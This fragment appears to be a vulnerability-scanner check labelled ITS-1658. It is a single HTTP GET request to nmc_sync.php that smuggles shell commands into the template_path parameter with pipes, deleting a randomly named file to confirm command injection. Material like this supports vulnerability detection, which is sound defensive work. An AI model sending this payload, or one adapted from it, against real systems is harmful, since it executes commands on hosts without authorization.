# Vulnerable: ITS-1658
GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat
